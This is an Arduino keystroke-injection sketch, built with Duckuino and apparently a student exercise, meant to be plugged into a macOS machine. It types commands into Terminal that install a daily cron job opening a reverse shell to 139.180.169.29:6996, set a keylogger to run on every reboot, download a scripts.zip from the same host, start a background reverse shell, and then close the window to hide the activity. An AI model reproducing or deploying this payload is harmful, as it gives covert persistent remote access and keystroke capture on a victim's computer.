/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // spawns a reverse shell
  // Shrey Somaiya z5257343
  // 2 April 2020
  // Set default delay 200ms
  // Command + Space ==> spotlight search
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  // Search for termina
  delay(2000);
  Keyboard.print(F("terminal"));

  typeKey(KEY_RETURN);

  delay(2000);
  Keyboard.print(F("bash"));

  typeKey(KEY_RETURN);

  // enable background jobs
  delay(2000);
  Keyboard.print(F("set -m"));

  typeKey(KEY_RETURN);

  // add reverse shell to cron
  // set the reverse shell to occur 11am every day
  delay(2000);
  Keyboard.print(F("{crontab -l; echo '0 11 * * * /bin/sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit';} | crontab -"));

  typeKey(KEY_RETURN);

  // set cron job for keylogger on reboot
  delay(2000);
  Keyboard.print(F("{ crontab -l; echo '@reboot python3 ~/.config/Chrome/osx-keylogger.py'; } | crontab -"));

  typeKey(KEY_RETURN);

  // download and unzip the scripts
  delay(2000);
  Keyboard.print(F("curl http://139.180.169.29:8000/scripts.zip --output ~/.config/Chrome/scripts.zip"));

  typeKey(KEY_RETURN);

  // spawns a reverse shell in background
  delay(2000);
  Keyboard.print(F("sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit"));

  typeKey(KEY_RETURN);

  // we were never here!
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}